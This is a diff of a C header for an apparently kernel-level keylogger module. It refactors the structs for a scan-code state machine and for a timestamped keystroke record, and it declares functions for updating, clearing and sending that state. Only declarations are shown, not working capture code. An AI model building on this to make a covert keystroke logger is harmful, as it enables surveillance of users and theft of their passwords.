@@ -45,39 +45,36 @@ ssize_t keylogger_read(struct file *filp, char __user *buffer,
 ssize_t keylogger_write(struct file *filp, const char __user *buffer,
 				size_t length, loff_t *offset);
 
-struct file_operations keylogger_misc_fops;
-
-unsigned int scan_fsm;
-
 struct transition_table {
-	unsigned int	current;
+	unsigned int	ct;
 	unsigned int	input;
 	unsigned int	output;
 	int		state;
+	char		key;
+	char		position;
+	char		*name;
 };
 
 struct fsm {
-	unsigned int current;
-	unsigned int state;
+	unsigned int	ct;
+	unsigned int 	state;
+	char		key;	
+	char		position;
+	char		*name;
 };
 
-struct s_stroke {
-	unsigned char	key;
-	unsigned char	state;
-	char		name[25];
-	struct	tm	tm;
-	struct s_stroke	*next;
+struct keystroke {
+	unsigned char		key;
+	unsigned char		state;
+	char			name[25];
+	struct timeval		tv;
+	struct list_head	list;
 };
 
-struct scan_to_key {
-	unsigned int 	st_code;
-	unsigned int 	nd_code;
-	char		key;
-};	
+void	scan_fsm_update(struct fsm *scan_fsm, unsigned int new);
 
-struct scan_state {
-	unsigned int	scan_code;
-	char		state;
-}
+void	scan_fsm_clear(struct fsm *scan_fsm);
+
+void	scan_fsm_send(struct fsm *scan_fsm, void *target);
 
 #endif
